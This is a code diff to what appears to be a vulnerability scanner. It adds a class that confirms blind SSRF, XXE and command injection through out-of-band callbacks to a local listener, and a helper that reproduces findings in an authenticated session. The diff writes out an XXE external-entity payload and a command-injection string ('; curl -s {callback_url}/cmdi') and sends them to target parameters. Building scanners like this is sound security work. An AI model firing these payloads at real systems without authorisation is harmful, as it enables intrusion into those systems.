@@ -17,12 +17,13 @@ Provides:
 from __future__ import annotations
 
 import hashlib
+import secrets
 import threading
 import time
+import urllib.parse
+import urllib.request
 from dataclasses import dataclass
 from typing import Any, Callable, Sequence
-
-import urllib.parse
 
 from packages.payload_engine import (
     CFGGrammarEngine,
@@ -30,6 +31,11 @@ from packages.payload_engine import (
     DynamicOracleSelector,
     VulnClass,
     WAFProbeLearner,
+)
+from packages.scanner_adapters.integrations.oob import (
+    OOBCollector,
+    OOBInteractionServer,
+    OOBTokenGenerator,
 )
 from packages.scanner_adapters.reproducer import (
     DeterministicReproducer,
@@ -230,6 +236,115 @@ class AdaptivePayloadEvaluator:
                     }
                 )
         return {"confirmed": confirmed, "waf_profile": waf_profile, "adaptations": adaptations}
+
+
+# --- Sector O6: Live OOB confirmation + authenticated reproduction ---
+
+
+class OOBBlindVerifier:
+    """Confirm blind SSRF/XXE/CMDi via a REAL out-of-band callback to a per-run loopback listener.
+
+    Fires a probe whose payload points at the reachable callback URL (not an unresolvable token
+    host), waits briefly for an inbound interaction, and returns a confirmed finding only if a
+    callback actually arrived. No callback -> no finding (zero false positives).
+    """
+
+    def __init__(self, host: str = "127.0.0.1") -> None:
+        # Per-run random secret so correlation tokens are unforgeable.
+        self.collector = OOBCollector(OOBTokenGenerator(secret_key=secrets.token_bytes(32)))
+        self.server = OOBInteractionServer(self.collector, host=host, port=0)
+
+    def __enter__(self) -> "OOBBlindVerifier":
+        self.server.start()
+        return self
+
+    def __exit__(self, *exc: Any) -> None:
+        self.server.stop()
+
+    def _payload_for(self, probe_type: str, callback_url: str) -> str:
+        if probe_type == "xxe":
+            return (
+                '<?xml version="1.0"?>'
+                f'<!DOCTYPE r [<!ENTITY % o SYSTEM "{callback_url}/xxe-dtd"> %o;]><r>t</r>'
+            )
+        if probe_type == "cmdi":
+            return f"; curl -s {callback_url}/cmdi"
+        return f"{callback_url}/ssrf"
+
+    @staticmethod
+    def _default_fire(base_url: str, param: str, payload: str) -> None:
+        sep = "&" if "?" in base_url else "?"
+        url = f"{base_url}{sep}{urllib.parse.urlencode({param: payload})}"
+        try:
+            urllib.request.urlopen(url, timeout=3.0).read()
+        except Exception:
+            pass
+
+    def probe_param(
+        self,
+        base_url: str,
+        param: str,
+        probe_type: str = "ssrf",
+        fire_fn: Callable[[str, str, str], None] | None = None,
+        wait_seconds: float = 1.5,
+    ) -> dict[str, Any] | None:
+        """Fire one OOB probe and return a confirmed finding iff a real callback is received."""
+        probe_id = secrets.token_hex(4)
+        token, _ = self.collector.register_probe(probe_id, probe_type, base_url, param)
+        callback_url = self.server.get_callback_url(token)
+        payload = self._payload_for(probe_type, callback_url)
+        (fire_fn or self._default_fire)(base_url, param, payload)
+        deadline = time.time() + wait_seconds
+        while time.time() < deadline:
+            if self.collector.poll(token) is not None:
+                break
+            time.sleep(0.05)
+        finding = self.collector.confirm_vulnerability(token)
+        if finding is not None:
+            # Carry structured OOB evidence in attributes and keep poc as a string so downstream
+            # reproducer stages do not re-process (and wrongly demote) an OOB-confirmed finding.
+            finding["attributes"] = {"oob": finding.get("poc"), "parameter": param}
+            finding["poc"] = f"Out-of-band {probe_type.upper()} callback received for {base_url} param '{param}'."
+            finding["affected_url"] = base_url
+        return finding
+
+
+class AuthenticatedReproducer:
+    """Reproduce a finding behind authentication: log in, carry the session, then verify.
+
+    Lets the reproducer reach auth-gated vulnerabilities that an unauthenticated probe cannot.
+    """
+
+    def __init__(self, reproducer: DeterministicReproducer | None = None) -> None:
+        self.reproducer = reproducer or DeterministicReproducer()
+
+    def reproduce_authenticated(
+        self,
+        destination: Any,
+        allow_ip: str,
+        identity: Any,
+        base_url: str,
+        fuzz_param: str,
+        active_payload: str,
+        canary: str | None = None,
+        is_time_based: bool = False,
+        method: str = "GET",
+    ) -> Any:
+        """Authenticate using the identity's AuthConfig, then reproduce with the live session headers."""
+        from packages.scanner_adapters.integrations.authorization import AuthenticatedSession
+
+        session = AuthenticatedSession(destination, allow_ip, identity)
+        session.reauthenticate()  # performs the real login flow if configured
+        headers = session.get_effective_headers()
+        return self.reproducer.verify_finding(
+            base_url=base_url,
+            fuzz_param=fuzz_param,
+            active_payload=active_payload,
+            canary=canary,
+            is_time_based=is_time_based,
+            headers=headers,
+            method=method,
+        )
 
 
 # --- Sector 2B.3: Attack Graph Min-Cut Chain Executor ---
@@ -557,6 +672,8 @@ class MitreAttackMapper:
 
 __all__ = [
     "AdaptivePayloadEvaluator",
+    "AuthenticatedReproducer",
+    "OOBBlindVerifier",
     "AttackGraphChainExecutor",
     "AuthorizedExploitModule",
     "BenignSessionReceipt",
